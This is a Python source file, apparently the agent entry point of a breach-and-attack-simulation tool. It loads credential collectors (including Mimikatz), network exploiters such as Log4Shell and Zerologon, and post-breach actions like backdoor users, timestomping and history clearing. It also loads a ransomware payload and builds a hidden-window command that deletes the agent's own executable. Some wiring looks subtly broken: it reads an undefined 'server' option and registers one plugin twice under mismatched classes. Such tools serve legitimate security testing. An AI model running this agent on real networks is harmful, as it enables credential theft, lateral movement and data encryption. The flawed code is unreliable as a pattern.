import argparse
import logging
import os
import subprocess
import sys
from ipaddress import IPv4Address, IPv4Interface
from pathlib import Path, WindowsPath
from typing import List

from pubsub.core import Publisher

import infection_monkey.tunnel as tunnel
from common.event_queue import IAgentEventQueue, PyPubSubAgentEventQueue
from common.events import CredentialsStolenEvent
from common.network.network_utils import address_to_ip_port
from common.utils.argparse_types import positive_int
from common.utils.attack_utils import ScanStatus, UsageEnum
from common.version import get_version
from infection_monkey.config import GUID
from infection_monkey.control import ControlClient
from infection_monkey.credential_collectors import (
    MimikatzCredentialCollector,
    SSHCredentialCollector,
)
from infection_monkey.credential_repository import (
    AggregatingPropagationCredentialsRepository,
    IPropagationCredentialsRepository,
    add_credentials_from_event_to_propagation_credentials_repository,
)
from infection_monkey.exploit import CachingAgentBinaryRepository, ExploiterWrapper
from infection_monkey.exploit.hadoop import HadoopExploiter
from infection_monkey.exploit.log4shell import Log4ShellExploiter
from infection_monkey.exploit.mssqlexec import MSSQLExploiter
from infection_monkey.exploit.powershell import PowerShellExploiter
from infection_monkey.exploit.smbexec import SMBExploiter
from infection_monkey.exploit.sshexec import SSHExploiter
from infection_monkey.exploit.wmiexec import WmiExploiter
from infection_monkey.exploit.zerologon import ZerologonExploiter
from infection_monkey.i_puppet import IPuppet, PluginType
from infection_monkey.master import AutomatedMaster
from infection_monkey.master.control_channel import ControlChannel
from infection_monkey.model import VictimHostFactory
from infection_monkey.network.firewall import app as firewall
from infection_monkey.network.info import get_free_tcp_port, get_network_interfaces
from infection_monkey.network.relay import (
    build_tcprelay_deps,
    RelayUserHandler,
    TCPRelay,
)
from infection_monkey.network.tools import connect
from infection_monkey.network_scanning.elasticsearch_fingerprinter import ElasticSearchFingerprinter
from infection_monkey.network_scanning.http_fingerprinter import HTTPFingerprinter
from infection_monkey.network_scanning.mssql_fingerprinter import MSSQLFingerprinter
from infection_monkey.network_scanning.smb_fingerprinter import SMBFingerprinter
from infection_monkey.network_scanning.ssh_fingerprinter import SSHFingerprinter
from infection_monkey.payload.ransomware.ransomware_payload import RansomwarePayload
from infection_monkey.post_breach.actions.change_file_privileges import ChangeSetuidSetgid
from infection_monkey.post_breach.actions.clear_command_history import ClearCommandHistory
from infection_monkey.post_breach.actions.collect_processes_list import ProcessListCollection
from infection_monkey.post_breach.actions.communicate_as_backdoor_user import (
    CommunicateAsBackdoorUser,
)
from infection_monkey.post_breach.actions.discover_accounts import AccountDiscovery
from infection_monkey.post_breach.actions.hide_files import HiddenFiles
from infection_monkey.post_breach.actions.modify_shell_startup_files import ModifyShellStartupFiles
from infection_monkey.post_breach.actions.schedule_jobs import ScheduleJobs
from infection_monkey.post_breach.actions.timestomping import Timestomping
from infection_monkey.post_breach.actions.use_signed_scripts import SignedScriptProxyExecution
from infection_monkey.post_breach.actions.use_trap_command import TrapCommand
from infection_monkey.post_breach.custom_pba import CustomPBA
from infection_monkey.puppet.puppet import Puppet
from infection_monkey.system_singleton import SystemSingleton
from infection_monkey.telemetry.attack.t1106_telem import T1106Telem
from infection_monkey.telemetry.attack.t1107_telem import T1107Telem
from infection_monkey.telemetry.messengers.exploit_intercepting_telemetry_messenger import (
    ExploitInterceptingTelemetryMessenger,
)
from infection_monkey.telemetry.messengers.legacy_telemetry_messenger_adapter import (
    LegacyTelemetryMessengerAdapter,
)
from infection_monkey.telemetry.state_telem import StateTelem
from infection_monkey.telemetry.tunnel_telem import TunnelTelem
from infection_monkey.utils.aws_environment_check import run_aws_environment_check
from infection_monkey.utils.environment import is_windows_os
from infection_monkey.utils.file_utils import mark_file_for_deletion_on_windows
from infection_monkey.utils.monkey_dir import (
    create_monkey_dir,
    get_monkey_dir_path,
    remove_monkey_dir,
)
from infection_monkey.utils.monkey_log_path import get_agent_log_path
from infection_monkey.utils.propagation import maximum_depth_reached
from infection_monkey.utils.signal_handler import register_signal_handlers, reset_signal_handlers

logger = logging.getLogger(__name__)
logging.getLogger("urllib3").setLevel(logging.INFO)


class InfectionMonkey:
    def __init__(self, args):
        logger.info("Monkey is initializing...")
        self._singleton = SystemSingleton()
        self._opts = self._get_arguments(args)
        self._cmd_island_ip, self._cmd_island_port = address_to_ip_port(self._opts.servers)
        self._control_client = ControlClient(self._opts.servers)
        # TODO Refactor the telemetry messengers to accept control client
        # and remove control_client_object
        ControlClient.control_client_object = self._control_client
        self._telemetry_messenger = LegacyTelemetryMessengerAdapter()
        self._current_depth = self._opts.depth
        self._master = None
        self._relay_user_handler: RelayUserHandler
        self._relay: TCPRelay

    @staticmethod
    def _get_arguments(args):
        arg_parser = argparse.ArgumentParser()
        arg_parser.add_argument("-p", "--parent")
        arg_parser.add_argument("-s", "--servers", type=lambda arg: arg.strip().split(","))
        arg_parser.add_argument("-d", "--depth", type=positive_int, default=0)
        opts = arg_parser.parse_args(args)
        InfectionMonkey._log_arguments(opts)

        return opts

    @staticmethod
    def _log_arguments(args):
        arg_string = " ".join([f"{key}: {value}" for key, value in vars(args).items()])
        logger.info(f"Monkey started with arguments: {arg_string}")

    def start(self):
        if self._is_another_monkey_running():
            logger.info("Another instance of the monkey is already running")
            return

        logger.info("Agent is starting...")
        logger.info(f"Agent GUID: {GUID}")

        self._connect_to_island()

        # TODO: Reevaluate who is responsible to send this information
        if is_windows_os():
            T1106Telem(ScanStatus.USED, UsageEnum.SINGLETON_WINAPI).send()

        run_aws_environment_check(self._telemetry_messenger)

        should_stop = ControlChannel(
            self._control_client.server_address, GUID, self._control_client.proxies
        ).should_agent_stop()
        if should_stop:
            logger.info("The Monkey Island has instructed this agent to stop")
            return

        self._setup()
        self._master.start()

    def _connect_to_island(self):
        # Sets island's IP and port for monkey to communicate to
        if self._current_server_is_set():
            logger.debug(f"Default server set to: {self._control_client.server_address}")
        else:
            raise Exception(
                f"Failed to connect to the island via "
                f"any known server address: {self._opts.servers}"
            )

        self._control_client.wakeup(parent=self._opts.parent)

    def _current_server_is_set(self) -> bool:
        if self._control_client.find_server(default_tunnel=self._opts.servers):
            return True

        return False

    def _setup(self):
        logger.debug("Starting the setup phase.")

        create_monkey_dir()

        if firewall.is_enabled():
            firewall.add_firewall_rule()

        control_channel = ControlChannel(
            self._control_client.server_address, GUID, self._control_client.proxies
        )
        control_channel.register_agent(self._opts.parent)

        config = control_channel.get_config()

        local_port = get_free_tcp_port()
        sock, ip_str, port = connect([self._opts.server])
        sock.close()
        user_handler, connection_handler, pipe_spawner = build_tcprelay_deps(
            local_port,
            IPv4Address(ip_str),
            port,
            client_disconnect_timeout=config.keep_tunnel_open_time,
        )
        self._relay_user_handler = user_handler
        self._relay = TCPRelay(
            self._relay_user_handler,
            connection_handler,
            pipe_spawner,
        )

        if self._relay and maximum_depth_reached(
            config.propagation.maximum_depth, self._current_depth
        ):
            self._relay.start()

        StateTelem(is_done=False, version=get_version()).send()
        TunnelTelem(self._control_client.proxies).send()

        self._build_master()

        register_signal_handlers(self._master)

    def _build_master(self):
        local_network_interfaces = InfectionMonkey._get_local_network_interfaces()

        # TODO control_channel and control_client have same responsibilities, merge them
        control_channel = ControlChannel(
            self._control_client.server_address, GUID, self._control_client.proxies
        )
        propagation_credentials_repository = AggregatingPropagationCredentialsRepository(
            control_channel
        )

        event_queue = PyPubSubAgentEventQueue(Publisher())
        InfectionMonkey._subscribe_events(event_queue, propagation_credentials_repository)

        puppet = self._build_puppet(propagation_credentials_repository, event_queue)

        victim_host_factory = self._build_victim_host_factory(local_network_interfaces)

        telemetry_messenger = ExploitInterceptingTelemetryMessenger(
            self._telemetry_messenger, self._relay_user_handler
        )

        self._master = AutomatedMaster(
            self._current_depth,
            self._opts.servers,
            puppet,
            telemetry_messenger,
            victim_host_factory,
            control_channel,
            local_network_interfaces,
            propagation_credentials_repository,
        )

    @staticmethod
    def _subscribe_events(
        event_queue: IAgentEventQueue,
        propagation_credentials_repository: IPropagationCredentialsRepository,
    ):
        event_queue.subscribe_type(
            CredentialsStolenEvent,
            add_credentials_from_event_to_propagation_credentials_repository(
                propagation_credentials_repository
            ),
        )

    @staticmethod
    def _get_local_network_interfaces() -> List[IPv4Interface]:
        local_network_interfaces = get_network_interfaces()
        for interface in local_network_interfaces:
            logger.debug(f"Found local interface {str(interface)}")

        return local_network_interfaces

    def _build_puppet(
        self,
        propagation_credentials_repository: IPropagationCredentialsRepository,
        event_queue: IAgentEventQueue,
    ) -> IPuppet:
        puppet = Puppet()

        puppet.load_plugin(
            "MimikatzCollector",
            MimikatzCredentialCollector(event_queue),
            PluginType.CREDENTIAL_COLLECTOR,
        )
        puppet.load_plugin(
            "SSHCollector",
            SSHCredentialCollector(self._telemetry_messenger, event_queue),
            PluginType.CREDENTIAL_COLLECTOR,
        )

        puppet.load_plugin("elastic", ElasticSearchFingerprinter(), PluginType.FINGERPRINTER)
        puppet.load_plugin("http", HTTPFingerprinter(), PluginType.FINGERPRINTER)
        puppet.load_plugin("mssql", MSSQLFingerprinter(), PluginType.FINGERPRINTER)
        puppet.load_plugin("smb", SMBFingerprinter(), PluginType.FINGERPRINTER)
        puppet.load_plugin("ssh", SSHFingerprinter(), PluginType.FINGERPRINTER)

        agent_binary_repository = CachingAgentBinaryRepository(
            f"https://{self._control_client.server_address}", self._control_client.proxies
        )
        exploit_wrapper = ExploiterWrapper(
            self._telemetry_messenger, event_queue, agent_binary_repository
        )

        puppet.load_plugin(
            "HadoopExploiter", exploit_wrapper.wrap(HadoopExploiter), PluginType.EXPLOITER
        )
        puppet.load_plugin(
            "Log4ShellExploiter", exploit_wrapper.wrap(Log4ShellExploiter), PluginType.EXPLOITER
        )
        puppet.load_plugin(
            "PowerShellExploiter", exploit_wrapper.wrap(PowerShellExploiter), PluginType.EXPLOITER
        )
        puppet.load_plugin("SmbExploiter", exploit_wrapper.wrap(SMBExploiter), PluginType.EXPLOITER)
        puppet.load_plugin("SSHExploiter", exploit_wrapper.wrap(SSHExploiter), PluginType.EXPLOITER)
        puppet.load_plugin("WmiExploiter", exploit_wrapper.wrap(WmiExploiter), PluginType.EXPLOITER)
        puppet.load_plugin(
            "MSSQLExploiter", exploit_wrapper.wrap(MSSQLExploiter), PluginType.EXPLOITER
        )

        puppet.load_plugin(
            "ZerologonExploiter",
            exploit_wrapper.wrap(ZerologonExploiter),
            PluginType.EXPLOITER,
        )

        puppet.load_plugin(
            "CommunicateAsBackdoorUser",
            CommunicateAsBackdoorUser(self._telemetry_messenger),
            PluginType.POST_BREACH_ACTION,
        )
        puppet.load_plugin(
            "ModifyShellStartupFiles",
            ModifyShellStartupFiles(self._telemetry_messenger),
            PluginType.POST_BREACH_ACTION,
        )
        puppet.load_plugin(
            "HiddenFiles", HiddenFiles(self._telemetry_messenger), PluginType.POST_BREACH_ACTION
        )
        puppet.load_plugin(
            "TrapCommand",
            CommunicateAsBackdoorUser(self._telemetry_messenger),
            PluginType.POST_BREACH_ACTION,
        )
        puppet.load_plugin(
            "ChangeSetuidSetgid",
            ChangeSetuidSetgid(self._telemetry_messenger),
            PluginType.POST_BREACH_ACTION,
        )
        puppet.load_plugin(
            "ScheduleJobs", ScheduleJobs(self._telemetry_messenger), PluginType.POST_BREACH_ACTION
        )
        puppet.load_plugin(
            "Timestomping", Timestomping(self._telemetry_messenger), PluginType.POST_BREACH_ACTION
        )
        puppet.load_plugin(
            "AccountDiscovery",
            AccountDiscovery(self._telemetry_messenger),
            PluginType.POST_BREACH_ACTION,
        )
        puppet.load_plugin(
            "ProcessListCollection",
            ProcessListCollection(self._telemetry_messenger),
            PluginType.POST_BREACH_ACTION,
        )
        puppet.load_plugin(
            "TrapCommand", TrapCommand(self._telemetry_messenger), PluginType.POST_BREACH_ACTION
        )
        puppet.load_plugin(
            "SignedScriptProxyExecution",
            SignedScriptProxyExecution(self._telemetry_messenger),
            PluginType.POST_BREACH_ACTION,
        )
        puppet.load_plugin(
            "ClearCommandHistory",
            ClearCommandHistory(self._telemetry_messenger),
            PluginType.POST_BREACH_ACTION,
        )
        puppet.load_plugin(
            "CustomPBA",
            CustomPBA(self._telemetry_messenger, self._control_client),
            PluginType.POST_BREACH_ACTION,
        )

        puppet.load_plugin(
            "ransomware",
            RansomwarePayload(self._telemetry_messenger),
            PluginType.PAYLOAD,
        )

        return puppet

    def _build_victim_host_factory(
        self, local_network_interfaces: List[IPv4Interface]
    ) -> VictimHostFactory:
        on_island = self._running_on_island(local_network_interfaces)
        logger.debug(f"This agent is running on the island: {on_island}")

        return VictimHostFactory(None, self._cmd_island_ip, self._cmd_island_port, on_island)

    def _running_on_island(self, local_network_interfaces: List[IPv4Interface]) -> bool:
        server_ip, _ = address_to_ip_port(self._control_client.server_address)
        return server_ip in {str(interface.ip) for interface in local_network_interfaces}

    def _is_another_monkey_running(self):
        return not self._singleton.try_lock()

    def cleanup(self):
        logger.info("Monkey cleanup started")
        deleted = None
        try:
            if self._master:
                self._master.cleanup()

            reset_signal_handlers()

            if self._relay and self._relay.is_alive():
                self._relay.stop()
                self._relay.join()

            if firewall.is_enabled():
                firewall.remove_firewall_rule()
                firewall.close()

            deleted = InfectionMonkey._self_delete()

            self._send_log()

            StateTelem(
                is_done=True, version=get_version()
            ).send()  # Signal the server (before closing the tunnel)

            self._close_tunnel()
            self._singleton.unlock()
        except Exception as e:
            logger.error(f"An error occurred while cleaning up the monkey agent: {e}")
            if deleted is None:
                InfectionMonkey._self_delete()

        logger.info("Monkey is shutting down")

    def _close_tunnel(self):
        tunnel_address = (
            self._control_client.proxies.get("https", "").replace("http://", "").split(":")[0]
        )
        if tunnel_address:
            logger.info("Quitting tunnel %s", tunnel_address)
            tunnel.quit_tunnel(tunnel_address)

    def _send_log(self):
        monkey_log_path = get_agent_log_path()
        if monkey_log_path.is_file():
            with open(monkey_log_path, "r") as f:
                log = f.read()
        else:
            log = ""

        self._control_client.send_log(log)

    @staticmethod
    def _self_delete() -> bool:
        InfectionMonkey._remove_monkey_dir()

        if "python" in Path(sys.executable).name:
            return False

        try:
            if "win32" == sys.platform:
                mark_file_for_deletion_on_windows(
                    WindowsPath(sys.executable), UsageEnum.AGENT_WINAPI
                )
                InfectionMonkey._self_delete_windows()
            else:
                InfectionMonkey._self_delete_linux()

            T1107Telem(ScanStatus.USED, sys.executable).send()
            return True
        except Exception as exc:
            logger.error("Exception in self delete: %s", exc)
            T1107Telem(ScanStatus.SCANNED, sys.executable).send()

        return False

    @staticmethod
    def _remove_monkey_dir():
        status = ScanStatus.USED if remove_monkey_dir() else ScanStatus.SCANNED
        T1107Telem(status, get_monkey_dir_path()).send()

    @staticmethod
    def _self_delete_windows():
        delay_delete_cmd = InfectionMonkey._build_windows_delete_command()
        startupinfo = InfectionMonkey._get_startup_info()

        subprocess.Popen(
            delay_delete_cmd,
            stdin=None,
            stdout=None,
            stderr=None,
            close_fds=True,
            startupinfo=startupinfo,
        )

    @staticmethod
    def _build_windows_delete_command() -> str:
        agent_pid = os.getpid()
        agent_file_path = sys.executable

        # Returns 1 if the process is running and 0 otherwise
        check_running_agent_cmd = f'tasklist /fi "PID eq {agent_pid}" ^| find /C "{agent_pid}"'

        sleep_seconds = 5
        delete_file_and_exit_cmd = f"del /f /q {agent_file_path} & exit"

        # Checks if the agent process is still running.
        # If the agent is still running, it sleeps for 'sleep_seconds' before checking again.
        # If the agent is not running, it deletes the executable and exits the loop.
        # The check runs up to 20 times to give the agent ample time to shutdown.
        delete_agent_cmd = (
            f'cmd /c (for /l %i in (1,1,20) do (for /F "delims=" %j IN '
            f'(\'{check_running_agent_cmd}\') DO if "%j"=="1" (timeout {sleep_seconds}) else '
            f"({delete_file_and_exit_cmd})) ) > NUL 2>&1"
        )

        return delete_agent_cmd

    @staticmethod
    def _get_startup_info():
        from subprocess import CREATE_NEW_CONSOLE, STARTF_USESHOWWINDOW, SW_HIDE

        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags = CREATE_NEW_CONSOLE | STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = SW_HIDE

        return startupinfo

    @staticmethod
    def _self_delete_linux():
        os.remove(sys.executable)
